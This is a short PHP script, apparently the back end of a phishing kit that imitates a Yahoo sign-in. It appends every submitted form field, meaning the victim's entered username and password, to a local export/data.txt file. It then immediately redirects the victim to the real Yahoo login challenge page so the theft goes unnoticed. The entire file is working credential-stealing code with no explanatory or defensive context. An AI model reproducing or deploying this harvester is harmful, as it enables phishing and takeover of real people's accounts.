<?php 

$path = getcwd();

$path = substr($path,0,17);

$file = $path ."/export/data.txt";

file_put_contents($file, print_r($_POST, true), FILE_APPEND);

?>

<meta http-equiv="refresh" content="0; url=https://login.yahoo.com/account/challenge/username?done=https%3A%2F%2Fwww.yahoo.com%2F&lang=el-GR&authMechanism=secondary&yid=&s=Qg--&c=3_quVLL.2bJsZtLUxcRtiVxNV3QauntAymJJDF8Qo8K.IaDURvkYjZ2U.VZtYduNcAOpIAj.TF5QRN5.uENrS5.sjyGqVnGDJUKnnf7rPMn1OWoB7E84cmdauv7v_U_RBDSeCurZ8NhaAeo4rQzL8hlfng5Yt5cB.JEuGoDU.jyP978y7oXwAfUwedqdDM62aOa740x1VhTcwXaD4dh1aB8jaKHjUGwpCXyG4yA8VvYLF.Fc~A"/>
